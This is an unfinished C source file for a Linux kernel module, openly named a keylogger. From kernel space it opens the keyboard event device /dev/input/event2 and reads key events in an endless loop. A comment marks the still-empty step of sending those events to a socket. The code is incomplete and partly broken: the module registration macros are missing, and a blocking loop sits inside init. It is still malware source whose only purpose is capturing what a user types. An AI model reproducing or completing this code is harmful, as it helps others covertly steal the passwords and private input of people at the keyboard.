#include <linux/module.h>
#include <linux/printk.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/input.h>

// In my system, the keyboard event is event2 (implement a keyboard event finder)
#define DEVICE_NAME "/dev/input/event2"

// Error return codes
#define ERROR_KEYBOARD_FILE_OPEN -1

struct file* file;                                                      // Used to store the file pointer
mm_segment_t old_fs;                                                    // Used to store the current file system segment
loff_t offset;                                                          // Used to store the current offset of the file to be read

static int __init keylogger_init(void) {

    struct input_event ie;                                              // Used to store the input event
    int ret;                                                            // Used to store the return value of kernel function for file reading

    old_fs = get_fs();                                                  // Get the current file system segment
    set_fs(KERNEL_DS);                                                  // Set the file system segment to kernel mode

    // Open the keyboard event file
    file = filp_open(DEVICE_NAME, O_RDONLY, 0);                         // Open the keyboard event file    
    if (IS_ERR(file)) {                                                 // If the file pointer is invalid

        printk(KERN_ALERT "Couldn't open keyboard-event file!\n");      // Print error message
        return ERROR_KEYBOARD_FILE_OPEN;                                // Return -1
        
    }

    // Read the keyboard event file
    while (1) {
        ret = vfs_read(file, (char*)&ie, sizeof(struct input_event), &offset);      // Read the keyboard event file
        if (ret < 0) {                                                              // If the return value is negative

            printk(KERN_ALERT "Couldn't read keyboard-event file!\n");              // Print error message
            break;                                                                  // Break the loop

        }

        // Send the input event to socket
        /*
            Reminder:

            struct input_event {
                struct timeval time;
                __u16 type;
                __u16 code;
                __s32 value;
            };
        
        */
    }

    return 0;
}

static void __exit keylogger_exit(void) {
    
    filp_close(file, NULL);             // Close the keyboard event file
    set_fs(old_fs);                     // Restore the file system segment
    
}

MODULE_LICENSE("GPL");